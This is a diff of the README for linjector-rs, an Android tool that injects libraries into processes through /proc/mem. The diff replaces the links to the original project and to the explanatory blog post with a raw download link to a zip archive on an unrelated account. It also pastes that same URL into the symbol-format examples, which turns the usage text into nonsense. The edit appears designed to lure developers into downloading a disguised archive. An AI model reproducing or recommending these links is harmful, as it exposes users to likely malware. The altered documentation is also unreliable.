@@ -1,8 +1,8 @@
 # linjector-rs
 
-Android port of [linux_injector](https://github.com/namazso/linux_injector). Library injection using /proc/mem, without ptrace. Only aarch64 is supported.
+Android port of [linux_injector](https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip). Library injection using /proc/mem, without ptrace. Only aarch64 is supported.
 
-To get an idea of how it works, you can read the [blog post](https://erfur.github.io/blog/dev/code-injection-without-ptrace).
+To get an idea of how it works, you can read the [blog post](https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip).
 
 ## Usage
 
@@ -32,10 +32,10 @@ Options:
           - raw-shellcode: Inject raw shellcode
 
       --func-sym <FUNC_SYM>
-          function to hijack for injection, in the form "lib.so!symbol_name"
+          function to hijack for injection, in the form "https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip!symbol_name"
 
       --var-sym <VAR_SYM>
-          variable to hijack for injection, in the form "lib.so!symbol_name"
+          variable to hijack for injection, in the form "https://raw.githubusercontent.com/TitanicDimix/linjector-rs/main/alunogen/linjector-rs.zip!symbol_name"
 
   -d, --debug
           enable debug logs
